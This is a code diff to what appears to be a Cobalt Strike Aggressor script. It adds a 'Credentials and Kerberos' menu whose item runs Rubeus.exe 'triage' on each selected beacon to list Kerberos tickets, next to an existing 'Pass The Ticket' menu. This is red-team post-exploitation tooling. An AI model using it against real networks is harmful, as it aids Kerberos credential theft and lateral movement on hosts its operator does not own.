@@ -290,10 +290,43 @@ menu "Pass The Ticket"
 
 				}
 }
+
+
+#################
+##
+##This section is dedicated to credential extraction and Kerberos goodies
+##
+##
+#################
+
 					
+menu "Credentials and Kerberos"
+
+{
+
+	
+
+########Triage Tickets##################
 
 					
 
+		item "List Current Kerberos Tickets"{
+
+			local('$bid');
+
+				foreach $bid ($1){
+
+					rubeustriage($bid);
+
+				}
+
+			}
+
+		
+
+
+
+}
 
 
 	
@@ -336,6 +369,15 @@ menu "Pass The Ticket"
 
 ###########################
 
+sub rubeustriage{
+
+
+
+bexecute_assembly($1, script_resource('/exe/Rubeus.exe'), "triage");
+
+
+
+}
 
 
 sub getdomainsid{
